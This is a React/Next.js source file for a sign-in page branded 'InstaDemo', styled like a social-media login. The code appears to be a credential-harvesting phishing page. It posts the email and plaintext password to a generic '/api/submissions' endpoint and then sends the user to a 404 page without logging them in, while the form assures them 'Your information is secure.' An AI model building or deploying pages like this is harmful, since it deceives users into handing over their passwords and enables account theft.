'use client'

import { FormEvent, useState } from 'react'
import { ArrowRight, LockKeyhole } from 'lucide-react'

export default function Page() {
  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [error, setError] = useState('')

  const [loading, setLoading] = useState(false)

  async function handleSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault()
    if (!email.trim() || !password) {
      setError('Enter your email and password.')
      return
    }

    try {
      setLoading(true)
      setError('')

      const res = await fetch('/api/submissions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      })

      if (!res.ok) {
        const data = await res.json().catch(() => ({}))
        throw new Error(data.error || 'Failed to submit form.')
      }

      window.location.assign('/404')
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Failed to submit form.')
    } finally {
      setLoading(false)
    }
  }

  return (
    <main className="min-h-screen bg-[#f5f7fb] px-5 py-8 text-slate-950 sm:px-8">
      <div className="mx-auto flex min-h-[calc(100vh-4rem)] max-w-5xl flex-col justify-between gap-12">
        <header className="flex items-center gap-3">
          <div className="grid size-10 place-items-center rounded-xl bg-indigo-600 text-lg font-black text-white shadow-lg shadow-indigo-600/20">I</div>
          <span className="text-lg font-bold tracking-tight">InstaDemo</span>
        </header>

        <section className="mx-auto w-full max-w-md">
          <div className="rounded-3xl border border-slate-200 bg-white p-7 shadow-xl shadow-slate-200/60 sm:p-9">
            <div className="mb-8"><p className="text-sm font-semibold text-indigo-600">Sign in</p><h1 className="mt-2 text-2xl font-bold">Welcome back</h1><p className="mt-2 text-sm text-slate-500">Enter your email and password to continue.</p></div>
            <form onSubmit={handleSubmit} className="space-y-5" noValidate>
              <label className="block text-sm font-semibold">Email<input value={email} onChange={(event) => setEmail(event.target.value)} type="email" autoComplete="email" placeholder="you@example.com" className="mt-2 h-12 w-full rounded-xl border border-slate-200 bg-slate-50 px-4 font-normal outline-none transition focus:border-indigo-500 focus:bg-white focus:ring-4 focus:ring-indigo-100" /></label>
              <label className="block text-sm font-semibold">Password<input value={password} onChange={(event) => setPassword(event.target.value)} type="password" autoComplete="current-password" placeholder="Enter your password" className="mt-2 h-12 w-full rounded-xl border border-slate-200 bg-slate-50 px-4 font-normal outline-none transition focus:border-indigo-500 focus:bg-white focus:ring-4 focus:ring-indigo-100" /></label>
              {error && <p role="alert" className="rounded-lg bg-rose-50 px-3 py-2 text-sm text-rose-700">{error}</p>}
              <button type="submit" disabled={loading} className="flex h-12 w-full items-center justify-center gap-2 rounded-xl bg-indigo-600 font-semibold text-white transition hover:bg-indigo-700 disabled:cursor-not-allowed disabled:opacity-70">
                {loading ? 'Logging in...' : 'Log in'} {!loading && <ArrowRight className="size-4" />}
              </button>
            </form>
            <p className="mt-6 flex items-center justify-center gap-2 text-center text-xs text-slate-400"><LockKeyhole className="size-3.5" /> Your information is secure.</p>
          </div>
        </section>

        <footer className="text-center text-xs text-slate-400">© 2026 InstaDemo</footer>
      </div>
    </main>
  )
}

